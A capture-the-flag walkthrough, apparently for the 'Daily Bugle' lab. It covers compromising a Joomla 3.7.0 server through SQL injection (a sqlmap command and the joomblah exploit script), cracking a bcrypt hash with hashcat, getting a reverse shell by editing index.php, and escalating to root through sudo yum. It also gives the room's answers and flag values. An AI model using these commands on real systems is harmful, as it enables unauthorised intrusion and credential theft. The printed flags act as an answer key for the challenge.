# Daily Bugle

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

## Task 1  Deploy

###  - Access the web server, who robbed the bank?

Before getting started, I like to start by enumerating ports.

`nmap -sC -sV -Pn -oN nmap/inital 10.10.82.106`

Next we can enumerate directories on webserver.

`gobuster -u http://10.10.160.160/ -w /opt/KaliLists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt`

Answer: `spiderman`

## Task 2  Obtain user and root

###  - What is the Joomla version?

https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website

`http://10.10.160.160/administrator/manifests/files/joomla.xml`

Answer: `3.7.0`

###  - *Instead of using SQLMap, why not use a python script!*What is Jonah's cracked password?

https://www.exploit-db.com/exploits/42033

`sqlmap -u "http://10.10.160.160/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`

`python3 joomblah.py http://10.10.160.160/`

`hashcat -a 0 -m 3200 -o PASSWORD.txt hash.txt /opt/KaliLists/rockyou.txt --force`

Answer: `spiderman123`

###  - What is the user flag?

Edited the index.php to gain a reverse shell.

https://pentestmonkey.net/tools/web-shells/php-reverse-shell

Read the configurations.php file in www/html/ to find creds for jjameson.

`27a260fe3cba712cfdedb1c86d80442e`

###  - What is the root flag?

Using sudo -l we can see what jjameson can access.

https://gtfobins.github.io/gtfobins/yum/

`eec3d53292b1821868266858d7fa6f79`
